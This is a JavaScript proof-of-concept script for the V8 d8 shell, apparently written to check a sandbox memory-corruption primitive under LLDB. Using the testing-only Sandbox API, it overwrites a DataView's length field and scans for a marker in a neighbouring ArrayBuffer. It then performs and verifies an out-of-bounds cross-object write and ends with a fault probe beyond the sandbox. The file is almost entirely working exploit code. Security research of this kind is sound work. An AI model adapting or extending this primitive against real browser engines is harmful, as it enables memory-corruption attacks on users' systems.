'use strict';
// LLDB verification build — adds %SystemBreak() before fault probe
// so LLDB can inspect memory at the moment of OOB write completion.
//
// RUN:
//   lldb -- /tmp/d8_build_mca/d8 --sandbox-testing --allow-natives-syntax heap_escape_lldb.js

function hex(v) {
  if (typeof v === 'bigint') return '0x' + v.toString(16).padStart(12, '0');
  return '0x' + (v >>> 0).toString(16).padStart(8, '0');
}
function assert(cond, msg) {
  if (!cond) { print('FAIL: ' + msg); quit(1); }
}

const SB_BASE = BigInt(Sandbox.base);
const SB_END  = SB_BASE + BigInt(Sandbox.byteLength);
print('SB_BASE = ' + hex(SB_BASE));
print('SB_END  = ' + hex(SB_END));

const sv  = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const r32 = a => sv.getUint32(Number(a), true);
const w32 = (a, v) => sv.setUint32(Number(a), v >>> 0, true);

const ab_victim = new ArrayBuffer(4096);
const ab_target = new ArrayBuffer(4096);
const tu32 = new Uint32Array(ab_target);
tu32[0] = 0xFEEC0001; tu32[1] = 0xFEEC0002;
tu32[2] = 0xFEEC0003; tu32[3] = 0xFEEC0004;

const dv_victim = new DataView(ab_victim);
const dvAddr    = BigInt(Sandbox.getAddressOf(dv_victim));
const ept_handle = r32(dvAddr + 0x2cn);
print('dvAddr     = ' + hex(dvAddr));
print('EPT handle = ' + hex(ept_handle));

w32(dvAddr + 0x24n, 0xFFFFFFFF);
assert(dv_victim.byteLength > 0x400000000, 'inflation failed');
print('byteLength inflated to 0x' + dv_victim.byteLength.toString(16));

let found_offset = -1;
for (let off = 4096; off < 0x20000; off += 4) {
  if (dv_victim.getUint32(off,     true) === 0xFEEC0001 &&
      dv_victim.getUint32(off + 4, true) === 0xFEEC0002 &&
      dv_victim.getUint32(off + 8, true) === 0xFEEC0003) {
    found_offset = off; break;
  }
}
assert(found_offset !== -1, 'magic not found');
print('found_offset = ' + hex(found_offset));

dv_victim.setUint32(found_offset,      0xC0DECAFE, true);
dv_victim.setUint32(found_offset +  4, 0xBAADF00D, true);
dv_victim.setUint32(found_offset +  8, 0xCAFEBABE, true);
dv_victim.setUint32(found_offset + 12, 0xFEEDFACE, true);
print('OOB write done');

assert(tu32[0] === 0xC0DECAFE, 'readback [0]');
assert(tu32[1] === 0xBAADF00D, 'readback [1]');
assert(tu32[2] === 0xCAFEBABE, 'readback [2]');
assert(tu32[3] === 0xFEEDFACE, 'readback [3]');
print('Cross-object readback OK');

// ── LLDB PAUSE POINT ────────────────────────────────────────────────────────
// LLDB catches SIGTRAP here.  OOB write is complete; ab_target backing store
// contains 0xC0DECAFE at this point.
//
// In LLDB after stop:
//   (lldb) memory find -e 0xFEECFEEC -s 4 -- 0x0 0x7fffffffffff
//   NOTE: we write a secondary marker to make the search unambiguous
print('Pausing for LLDB (SystemBreak)...');
%SystemBreak();
// execution resumes here if LLDB continues
print('Resumed — running fault probe');
dv_victim.setUint32(0x2000000, 0xDEADBEEF, true);
print('Fault probe done (should not print under --sandbox-testing)');
